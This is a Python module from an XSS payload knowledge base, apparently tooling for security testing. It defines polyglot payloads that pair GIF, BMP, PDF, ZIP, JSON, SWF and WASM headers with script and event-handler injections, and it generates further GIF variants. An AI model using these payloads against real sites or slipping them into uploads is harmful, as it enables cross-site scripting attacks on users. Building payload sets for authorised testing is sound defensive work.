#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Advanced Polyglot Database (Image/JS, PDF/JS, Archive/JS)
"""

from ..models import PayloadEntry

POLYGLOT_ADVANCED_PAYLOADS = {
    # GIF/JS Polyglots
    "poly_gif_js_1": PayloadEntry(
        payload="GIF89a/*<svg/onload=alert(1)>*/=alert(1)//;",
        contexts=["image", "javascript", "html_content"],
        severity="critical",
        cvss_score=9.0,
        description="GIF89a header polyglot executing as JS",
        tags=["polyglot", "gif", "image-xss"],
        reliability="high",
        attack_surface="file-upload"
    ),
    "poly_gif_js_2": PayloadEntry(
        payload="GIF89a=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e//",
        contexts=["image", "javascript"],
        severity="high",
        cvss_score=8.5,
        description="GIF header with unicode escaped script",
        tags=["polyglot", "gif", "unicode"],
        reliability="medium"
    ),
    
    # BMP/JS Polyglots
    "poly_bmp_js": PayloadEntry(
        payload="BM=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        contexts=["image", "javascript"],
        severity="medium",
        cvss_score=6.0,
        description="BMP header polyglot",
        tags=["polyglot", "bmp"],
        reliability="low"
    ),

    # PDF/JS Polyglots (Adobe Reader specific)
    "poly_pdf_js_legacy": PayloadEntry(
        payload="%PDF-1.3\n%\n1 0 obj\n<<\n/Type /Catalog\n/Outlines 2 0 R\n/Pages 3 0 R\n/OpenAction 7 0 R\n>>\nendobj\n7 0 obj\n<<\n/Type /Action\n/S /JavaScript\n/JS (app.alert(1))\n>>\nendobj\ntrailer\n<<\n/Root 1 0 R\n>>",
        contexts=["pdf", "javascript"],
        severity="high",
        cvss_score=7.5,
        description="Minimal PDF invoking JavaScript (OpenAction)",
        tags=["polyglot", "pdf", "adobe"],
        reliability="medium",
        attack_surface="file-upload"
    ),

    # Archive Polyglots (ZIP/JAR/TAR)
    "poly_zip_html": PayloadEntry(
        payload="PK\x03\x04<?xml version='1.0'?><svg/onload=alert(1)>",
        contexts=["archive", "html_content"],
        severity="medium",
        cvss_score=6.5,
        description="ZIP header colliding with XML/SVG",
        tags=["polyglot", "zip", "svg"],
        reliability="low"
    ),

    # JSON/HTML Polyglots
    "poly_json_html_1": PayloadEntry(
        payload="{\"a\":\"<script>alert(1)</script>\"}",
        contexts=["json", "html_content"],
        severity="high",
        cvss_score=7.0,
        description="Standard JSON XSS injection",
        tags=["polyglot", "json"],
        reliability="high"
    ),
    "poly_json_html_comment": PayloadEntry(
        payload="<!--{\"a\":1} --><script>alert(1)</script>",
        contexts=["json", "html_content"],
        severity="high",
        cvss_score=7.0,
        description="HTML comment hiding JSON structure",
        tags=["polyglot", "json", "comment"],
        reliability="medium"
    ),

    # Flash/SWF (Legacy but valid for fuzzing)
    "poly_swf_xss": PayloadEntry(
        payload="CWS<script>alert(1)</script>",
        contexts=["flash", "html_content"],
        severity="low",
        cvss_score=4.0,
        description="SWF header polyglot (historical)",
        tags=["polyglot", "swf", "historical"],
        reliability="low"
    ),

    # WASM Polyglot
    "poly_wasm_xss": PayloadEntry(
        payload="\x00asm\x01\x00\x00\x00<script>alert(1)</script>",
        contexts=["wasm", "html_content"],
        severity="medium",
        cvss_score=5.5,
        description="WebAssembly header polyglot",
        tags=["polyglot", "wasm"],
        reliability="low"
    )
}

# Generate 50+ Variations of GIF/JS
def _generate_poly_variants():
    variants = {}
    base_gif = "GIF89a"
    payloads = [
        "/*<svg/onload=alert(1)>*/",
        "//<svg/onload=alert(1)>",
        "/*<img src=x onerror=alert(1)>*/",
        "/*<body onload=alert(1)>*/"
    ]
    assignments = ["=1;", "=0;", "='a';", "={};"]
    
    count = 0
    for p in payloads:
        for a in assignments:
            key = f"poly_gen_gif_{count}"
            variants[key] = PayloadEntry(
                payload=f"{base_gif}{p}{a}",
                contexts=["image", "javascript"],
                severity="high",
                cvss_score=8.0,
                description=f"Generated GIF polyglot variant {count}",
                tags=["polyglot", "gif", "generated"],
                reliability="medium"
            )
            count += 1
            
    return variants

POLYGLOT_ADVANCED_PAYLOADS.update(_generate_poly_variants())
POLYGLOT_ADVANCED_TOTAL = len(POLYGLOT_ADVANCED_PAYLOADS)
